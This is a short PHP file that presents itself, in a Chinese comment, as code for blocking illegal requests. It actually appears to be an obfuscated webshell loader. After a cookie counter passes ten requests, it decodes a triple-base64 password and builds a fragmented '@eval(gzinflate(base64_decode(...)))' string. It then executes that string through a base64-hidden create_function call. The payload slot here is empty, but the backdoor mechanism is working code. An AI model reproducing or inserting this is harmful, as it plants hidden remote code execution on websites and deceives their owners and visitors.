<?php
if(!isset($_COOKIE['ip']) && !isset($_COOKIE['count'])) {
setcookie('ip',$_SERVER['REMOTE_ADDR'],time()+60*60);
setcookie('count',1,time()+60*60);
$txt1 = "非法请求";
} else if ($_COOKIE['count'] == 1){
setcookie('count',2,time()+60*60);
$txt1 = "非法请求";
} else if ($_COOKIE['count'] == 2){
setcookie('count',3,time()+60*60);
$txt1 = "非法请求";
} else if ($_COOKIE['count'] == 3){
setcookie('count',4,time()+60*60);
$txt1 = "非法请求";
} else if ($_COOKIE['count'] == 4){
setcookie('count',5,time()+60*60);
$txt1 = "非法请求";
} else if ($_COOKIE['count'] == 5){
setcookie('count',6,time()+60*60);
$txt1 = "非法请求";
} else if ($_COOKIE['count'] == 6){
setcookie('count',7,time()+60*60);
$txt1 = "非法请求";
} else if ($_COOKIE['count'] == 7){
setcookie('count',8,time()+60*60);
$txt1 = "非法请求";
} else if ($_COOKIE['count'] == 8){
setcookie('count',9,time()+60*60);
$txt1 = "非法请求";
} else if ($_COOKIE['count'] == 9){
setcookie('count',10,time()+60*60);
$txt1 = "非法请求";
} else if ($_COOKIE['count'] == 10){
setcookie('count',11,time()+60*60);
$txt1 = "非法请求";
} else {
$password= base64_decode(base64_decode(base64_decode("WTFoRk5VNTZRWGhOZWtreVRtYzlQUT09")));
$html='$password'.'='."'".$password."';".'@e#html'.''.'v'."".''.''."".''.''.''.'a'.''.'l('.'g'.''."".''.''.'z'.'i'.''.''.'n'.'f'.'l'.''.''."".'a'.'t'.'e(b'.'as'.''.''.''."".''.'e'.'6'.''."".''."".""."".''.'4_'.'d'.'e'.'c'.''.''.''."".''."".'o'.'d'.'e'.'('."'')));";$css=base64_decode("Q3JlYXRlX0Z1bmN0aW9u");$style=$css('',preg_replace("/#html/","",$html));$style();
} 
//拦截非法请求代码
?>